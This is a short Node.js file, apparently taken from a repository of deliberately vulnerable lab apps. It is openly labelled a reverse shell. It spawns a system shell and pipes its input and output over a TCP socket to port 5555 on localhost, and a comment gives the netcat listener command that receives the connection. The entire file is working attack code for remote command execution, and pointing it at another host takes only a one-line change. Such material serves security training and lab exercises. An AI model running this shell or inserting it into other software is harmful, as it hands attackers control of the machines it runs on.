// Original: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
// Nodejs reverse shell
// listen with: nc -vlnp 5555

(function () {
  var net = require("net"),
    cp = require("child_process");
  const { execSync } = require("child_process");
  const shPath = execSync("which sh").toString().trim();
  const sh = cp.spawn(shPath, []);
  var client = new net.Socket();
  client.connect(5555, "127.0.0.1", function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
})();
